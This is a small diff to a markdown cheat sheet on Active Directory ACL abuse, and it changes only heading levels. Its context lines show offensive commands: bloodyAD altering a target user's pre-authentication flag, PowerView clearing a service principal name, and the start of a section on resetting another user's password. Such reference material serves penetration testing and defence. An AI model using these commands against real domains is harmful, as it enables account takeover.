@@ -78,7 +78,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH
   ```
 
-### From Windows
+#### From Windows
 * **Using Powerview**  
 
   ```ps1
@@ -100,7 +100,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   # Remove the SPN
   PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
   ```
-#### Changing a users password
+### Changing a users password
 * **Usering Powershell & Powerview to change a users password**  
   ```powershell
   # Create PSCredential Object
